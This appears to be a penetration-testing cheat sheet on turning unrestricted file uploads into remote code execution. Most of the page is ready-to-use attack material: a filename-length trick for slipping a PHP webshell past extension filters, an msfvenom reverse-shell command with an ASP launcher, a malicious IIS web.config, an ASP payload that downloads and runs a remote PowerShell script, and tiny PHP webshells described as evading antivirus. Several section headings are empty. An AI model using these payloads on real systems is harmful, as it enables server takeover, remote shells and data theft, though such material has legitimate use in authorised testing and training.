---
title: Unrestricted File Upload
category: Web
order: 6
---

Different ways to upload files and get RCE.

# Identifies restrictions

## Extension

Shortening the size (falafel.htb):

Linux maximum 255 chars

```
touch $(python3 -c "print('A'*251+'.png')")
wget 'http://10.10.14.20:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.png'
```

Search the correct offset and upload again:

```
echo '<?php system($_GET["cmd"]);?>' > $(python3 -c 'print("A"*(236-4)+".php.png")')
wget 'http://10.10.14.20:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png'
```

## Size

## Name

## Magic Number

## Content

# ASP

First we need to generate the reverse shell.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o rev.exe
```

Finally upload the `rev.asp` and `rev.exe` files to get a connection shell back.

* Execute a binary

```
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /c c:\Inetpub\rev.exe",0,True)
%>
```

* Read internal files

```
<%
string path = @"C:\\Windows\\win.ini"; 
string txt = System.IO.File.ReadAllText(path); 
Response.Write(txt); 
%>
```

# .config RCE (IIS)

Uploading a `web.config` file to execute asp commands.

```
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />         
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>

<%
Response.write(1+1)
%>
```

If this works we can execute a reverse shell.

```
<%
Set objShell = CreateObject("WScript.Shell")
strCommand = "cmd /c powershell.exe -c IEX (New-Object Net.Webclient).downloadstring('http://<ip-addr>/shell.ps1')"
Set objShellExec = objShell.Exec(strCommand)
strOutput = objShellExec.StdOut.ReadAll()
WScript.StdOut.Write(strOutput)
WScript.Echo(strOutput)
%>
```
# PHP

The are some typicall PHP webshells, but some are detected by AV. Here are some usefull ones.

* https://github.com/bayufedra/Tiny-PHP-Webshell

```
<?=`$_GET[0]`?>

Usage :
  http://target.com/path/to/shell.php?0=command
```

```
<?=`$_POST[0]`?>

Usage :
  curl -X POST http://target.com/path/to/shell.php -d "0=command"
```
